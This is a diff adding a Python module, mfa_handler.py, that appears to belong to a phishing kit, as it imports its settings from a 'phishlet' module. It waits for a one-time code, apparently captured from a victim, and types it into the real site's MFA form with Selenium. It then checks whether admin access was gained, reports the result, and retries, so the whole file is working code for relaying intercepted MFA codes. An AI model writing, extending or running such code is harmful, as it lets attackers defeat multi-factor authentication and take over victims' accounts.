@@ -1,0 +1,240 @@
+# mfa_handler.py
+# MFA state management, OTP entry, and validation.
+
+import time
+import threading
+import traceback
+from selenium.webdriver.common.by import By
+
+from result_notifier import send_mfa_result
+from utils import find_digit_inputs
+from phishlet import (
+    MFA_INPUT_COUNT,
+    MFA_OTP_LENGTH,
+    MFA_VALIDATE_BUTTON_ID,
+    MFA_VALIDATE_BUTTON_JQUERY,
+    MFA_FAILURE_TEXT,
+    MFA_SUCCESS_URL_INDICATOR,
+)
+
+MAX_MFA_RETRIES    = 3
+OTP_TIMEOUT        = 300
+VALIDATION_CHECKS  = 5
+VALIDATION_INTERVAL = 0.5
+
+
+# ---------------------------------------------------------------------------
+# Low-level helpers
+# ---------------------------------------------------------------------------
+
+def _fill_digit_inputs(digit_inputs: list, otp: str) -> dict:
+    """
+    Clear and fill each OTP digit input with the corresponding character.
+
+    Returns:
+        dict with keys: success (bool), error (str | None)
+    """
+    for i in range(MFA_INPUT_COUNT):
+        try:
+            digit_inputs[i].clear()
+        except Exception:
+            pass
+
+    for i, digit in enumerate(otp):
+        try:
+            digit_inputs[i].click()
+            digit_inputs[i].clear()
+            digit_inputs[i].send_keys(digit)
+            time.sleep(0.2)
+        except Exception as e:
+            return {"success": False, "error": f"Failed on digit {i + 1}: {e}"}
+
+    return {"success": True, "error": None}
+
+
+def _click_validate_button(driver) -> dict:
+    """
+    Click the MFA validate button, falling back to jQuery if DOM lookup fails.
+
+    Returns:
+        dict with keys: success (bool), error (str | None)
+    """
+    try:
+        driver.find_element(By.ID, MFA_VALIDATE_BUTTON_ID).click()
+        return {"success": True, "error": None}
+    except Exception as primary_err:
+        try:
+            driver.execute_script(f"jQuery('{MFA_VALIDATE_BUTTON_JQUERY}').click();")
+            return {"success": True, "error": None}
+        except Exception as fallback_err:
+            return {
+                "success": False,
+                "error": f"Primary: {primary_err} | Fallback: {fallback_err}",
+            }
+
+
+def _check_validation_result(driver, checks: int = VALIDATION_CHECKS) -> str:
+    """
+    Poll the page to determine whether MFA validation succeeded or failed.
+
+    Returns:
+        'success'  — admin URL detected
+        'failed'   — failure text detected
+        'unclear'  — neither detected within the check window
+    """
+    for _ in range(checks):
+        try:
+            if MFA_SUCCESS_URL_INDICATOR in driver.current_url:
+                return "success"
+            body_text = driver.find_element(By.TAG_NAME, "body").text
+            if MFA_FAILURE_TEXT in body_text.lower():
+                return "failed"
+        except Exception:
+            pass
+        time.sleep(VALIDATION_INTERVAL)
+    return "unclear"
+
+
+# ---------------------------------------------------------------------------
+# MFA handler
+# ---------------------------------------------------------------------------
+
+class MFAHandler:
+    """Manages OTP state, callback registration, and the full MFA flow."""
+
+    def __init__(self):
+        self.otp_callback = None
+        self.received_otp: str | None = None
+        self.otp_received_event = threading.Event()
+
+    def reset_for_new_attempt(self) -> None:
+        """Clear OTP state in preparation for a new MFA attempt."""
+        self.received_otp = None
+        self.otp_received_event.clear()
+
+    def set_otp_callback(self):
+        """
+        Register and return a callback that records an incoming OTP
+        and signals the waiting handler thread.
+        """
+        def callback(otp: str) -> None:
+            self.received_otp = otp
+            self.otp_received_event.set()
+
+        self.otp_callback = callback
+        return callback
+
+    def handle_mfa_process(self, driver, port: int, _retries: int = 0) -> dict:
+        """
+        Orchestrate the full MFA flow: find inputs, wait for OTP, fill, and validate.
+
+        Args:
+            driver:   Selenium WebDriver instance
+            port:     Port the proxy is listening on
+            _retries: Internal retry counter (do not set manually)
+
+        Returns:
+            dict with keys:
+                - success (bool)
+                - error (str | None)
+        """
+        if _retries >= MAX_MFA_RETRIES:
+            send_mfa_result("mfa_failed")
+            return {"success": False, "error": f"Exceeded maximum retries ({MAX_MFA_RETRIES})"}
+
+        def retry(reason: str) -> dict:
+            send_mfa_result("mfa_failed")
+            return self.handle_mfa_process(driver, port, _retries=_retries + 1)
+
+        try:
+            # Step 1: locate digit inputs
+            digit_inputs = find_digit_inputs(driver)
+            if len(digit_inputs) != MFA_INPUT_COUNT:
+                return retry(f"Could not find all {MFA_INPUT_COUNT} digit input boxes")
+
+            # Step 2: wait for OTP
+            self.reset_for_new_attempt()
+            if not self.otp_received_event.wait(timeout=OTP_TIMEOUT):
+                send_mfa_result("mfa_failed")
+                return {"success": False, "error": "Timed out waiting for OTP"}
+
+            otp = self.received_otp
+            if len(otp) != MFA_OTP_LENGTH:
+                return retry(f"OTP must be {MFA_OTP_LENGTH} digits, got {len(otp)}")
+
+            # Step 3: fill inputs
+            fill_result = _fill_digit_inputs(digit_inputs, otp)
+            if not fill_result["success"]:
+                return retry(fill_result["error"])
+
+            # Step 4: click validate
+            click_result = _click_validate_button(driver)
+            if not click_result["success"]:
+                return retry(click_result["error"])
+
+            time.sleep(2)  # Allow page to respond before polling
+
+            # Step 5: check outcome
+            outcome = _check_validation_result(driver)
+            if outcome == "success":
+                send_mfa_result("mfa_success")
+                return {"success": True, "error": None}
+            else:
+                return retry(f"Validation outcome: {outcome}")
+
+        except Exception as e:
+            traceback.print_exc()
+            return retry(str(e))
+
+
+# ---------------------------------------------------------------------------
+# Async dispatcher
+# ---------------------------------------------------------------------------
+
+def handle_mfa_process_async(
+    driver,
+    port: int,
+    handler=None,
+    daemon: bool = True,
+) -> dict:
+    """
+    Dispatch handle_mfa_process to a background thread.
+
+    Args:
+        driver:  Selenium WebDriver instance
+        port:    Port the proxy is listening on
+        handler: MFAHandler instance to use (defaults to module-level mfa_handler)
+        daemon:  If True, thread exits when the main program exits
+
+    Returns:
+        dict with keys:
+            - success (bool)
+            - thread (threading.Thread | None)
+            - error (str | None)
+    """
+    if handler is None:
+        handler = mfa_handler
+
+    if not hasattr(handler, 'handle_mfa_process'):
+        return {"success": False, "thread": None, "error": f"Handler {handler!r} has no handle_mfa_process method"}
+
+    if not isinstance(port, int) or not (0 < port < 65536):
+        return {"success": False, "thread": None, "error": f"Invalid port: {port!r}"}
+
+    try:
+        thread = threading.Thread(
+            target=handler.handle_mfa_process,
+            args=(driver, port),
+            daemon=daemon,
+        )
+        thread.start()
+        return {"success": True, "thread": thread, "error": None}
+    except RuntimeError as e:
+        return {"success": False, "thread": None, "error": f"Could not start thread: {e}"}
+
+
+# ---------------------------------------------------------------------------
+# Module-level singleton
+# ---------------------------------------------------------------------------
+
+mfa_handler = MFAHandler()
